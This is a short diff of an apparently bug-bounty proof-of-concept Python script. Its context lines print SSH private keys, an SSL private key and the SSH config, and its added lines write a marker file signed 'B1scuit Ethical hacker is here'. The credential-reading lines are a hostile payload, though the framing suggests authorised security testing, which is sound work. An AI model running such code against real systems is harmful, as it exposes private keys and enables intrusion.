@@ -18,3 +18,5 @@ print(open('/home/user/.ssh/id_dsa').read())  # SSH DSA private key (if exists a
 print(open('/home/user/.ssh/id_ecdsa').read())  # SSH ECDSA private key (if exists and accessible)
 print(open('/etc/ssl/private/ssl-cert-snakeoil.key').read())  # SSL private key (if accessible)
 print(open('/home/user/.ssh/config').read())  # SSH config file
+open('/tmp/bug-bounty-hunter.txt', 'w').write('B1scuit Ethical hacker is here')
+print(open('/tmp/bug-bounty-hunter.txt').read())
